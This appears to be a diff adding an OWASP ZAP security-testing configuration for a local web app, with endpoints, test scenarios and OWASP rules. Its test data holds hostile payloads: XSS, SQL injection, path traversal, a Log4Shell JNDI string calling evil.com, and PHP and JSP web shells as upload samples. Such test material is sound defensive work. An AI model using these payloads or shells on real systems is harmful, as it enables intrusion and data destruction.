@@ -1,0 +1,129 @@
+# OWASP ZAP Security Testing Configuration
+
+# ZAP API Configuration
+zap:
+  host: "localhost"
+  port: 8080
+  api_key: "test-api-key"
+  timeout: 30000
+
+# Target Application
+target:
+  base_url: "http://localhost:8080"
+  endpoints:
+    - "/auth/login"
+    - "/auth/register"
+    - "/auth/logout"
+    - "/auth/me"
+    - "/instructions"
+    - "/instructions/1"
+    - "/analytics/dashboard"
+    - "/analytics/metrics"
+    - "/notifications"
+
+# Security Test Scenarios
+scenarios:
+  - name: "Authentication Security"
+    description: "Test authentication endpoints for security vulnerabilities"
+    endpoints:
+      - "/auth/login"
+      - "/auth/register"
+      - "/auth/logout"
+    tests:
+      - "SQL Injection"
+      - "XSS"
+      - "CSRF"
+      - "Brute Force"
+      - "Session Management"
+
+  - name: "API Security"
+    description: "Test API endpoints for security vulnerabilities"
+    endpoints:
+      - "/instructions"
+      - "/analytics/dashboard"
+      - "/notifications"
+    tests:
+      - "Input Validation"
+      - "Authorization Bypass"
+      - "Data Exposure"
+      - "Rate Limiting"
+      - "Error Handling"
+
+  - name: "File Upload Security"
+    description: "Test file upload endpoints for security vulnerabilities"
+    endpoints:
+      - "/instructions/upload"
+    tests:
+      - "File Type Validation"
+      - "Path Traversal"
+      - "Malicious File Upload"
+      - "Size Limits"
+
+# Security Policies
+policies:
+  - name: "OWASP Top 10"
+    enabled: true
+    rules:
+      - "A01:2021 - Broken Access Control"
+      - "A02:2021 - Cryptographic Failures"
+      - "A03:2021 - Injection"
+      - "A04:2021 - Insecure Design"
+      - "A05:2021 - Security Misconfiguration"
+      - "A06:2021 - Vulnerable Components"
+      - "A07:2021 - Authentication Failures"
+      - "A08:2021 - Software and Data Integrity Failures"
+      - "A09:2021 - Security Logging Failures"
+      - "A10:2021 - Server-Side Request Forgery"
+
+  - name: "Custom Security Rules"
+    enabled: true
+    rules:
+      - "JWT Token Validation"
+      - "Input Sanitization"
+      - "Rate Limiting"
+      - "CORS Configuration"
+      - "Security Headers"
+
+# Test Data
+test_data:
+  users:
+    - username: "test@example.com"
+      password: "password123"
+      role: "user"
+    - username: "admin@example.com"
+      password: "password123"
+      role: "admin"
+
+  malicious_inputs:
+    - "<script>alert('XSS')</script>"
+    - "'; DROP TABLE users; --"
+    - "../../../etc/passwd"
+    - "${jndi:ldap://evil.com/a}"
+    - "{{7*7}}"
+    - "javascript:alert(1)"
+
+  file_uploads:
+    - name: "malicious.php"
+      content: "<?php system($_GET['cmd']); ?>"
+      mime_type: "application/x-php"
+    - name: "malicious.jsp"
+      content: "<% Runtime.getRuntime().exec(request.getParameter('cmd')); %>"
+      mime_type: "application/x-jsp"
+    - name: "malicious.exe"
+      content: "MZ..."
+      mime_type: "application/x-executable"
+
+# Reporting
+reporting:
+  formats: ["html", "json", "xml"]
+  output_dir: "./test-results/security"
+  include_evidence: true
+  include_recommendations: true
+  severity_threshold: "medium"
+
+# Performance Settings
+performance:
+  max_scan_time: 3600  # 1 hour
+  concurrent_requests: 10
+  request_delay: 1000  # 1 second
+  timeout: 30000  # 30 seconds
